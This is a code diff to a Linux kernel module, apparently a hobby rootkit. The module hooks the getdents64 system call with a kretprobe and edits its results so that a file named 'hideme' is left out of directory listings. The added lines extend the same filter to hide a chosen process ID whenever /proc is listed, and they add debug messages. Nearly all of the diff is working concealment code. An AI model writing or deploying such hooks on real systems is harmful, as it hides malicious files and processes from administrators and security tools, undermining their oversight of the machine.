@@ -16,6 +16,7 @@
 /// const file name to hide
 const char* hide_file_name = "hideme";
 const int port_to_hide = 8000;
+const char* pid_to_hide = "3456";
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -40,6 +41,7 @@ struct getdent64_arguments {
 static bool hide_entry_by_name(struct linux_dirent64* entry, void* data){
     const char* str = data;
     if(strcmp(entry->d_name, str) == 0){
+        pr_info("Hidding %s\n", str);
         return true;
     }
     return false;
@@ -71,9 +73,26 @@ static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs
     struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
     unsigned long buffer_count = regs_return_value(regs);
 
+    // end 
+    if(buffer_count == 0)
+        return 0;
+
     // hide by name
-    unsigned long new_size = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, (void*)hide_file_name);
-    regs_set_return_value(regs, new_size);
+    unsigned long new_size_after_hide_file = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, (void*)hide_file_name);
+    regs_set_return_value(regs, new_size_after_hide_file);
+
+
+    // // hide process by pid
+    struct file* file = files_lookup_fd_raw(current->files, args->fd);
+    struct super_block* sb= file->f_path.mnt->mnt_sb;
+
+    if(strcmp(sb->s_id, "proc") == 0){
+        unsigned long new_size_after_hide_proc = hide_entry(args->buffer_ptr, new_size_after_hide_file, hide_entry_by_name, (void*)pid_to_hide);
+        pr_info("did proc hidden=%d\n", (new_size_after_hide_file - new_size_after_hide_proc) > 0);
+        regs_set_return_value(regs, new_size_after_hide_proc);    
+    }
+    
+    
 
     //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
     return 0;
